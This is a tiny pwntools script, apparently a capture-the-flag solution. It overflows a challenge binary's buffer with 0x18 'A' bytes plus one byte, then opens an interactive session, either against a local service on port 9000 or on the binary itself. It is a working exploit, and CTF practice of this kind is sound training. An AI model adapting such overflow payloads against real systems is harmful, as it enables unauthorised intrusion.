from pwn import *

e = context.binary = ELF("./chal")

REMOTE = 1

if REMOTE:
    p = remote("localhost", 9000)
else:
    p = e.process()

p.recv()
p.send(b"A" * 0x18 + b"\x0d")
p.interactive()
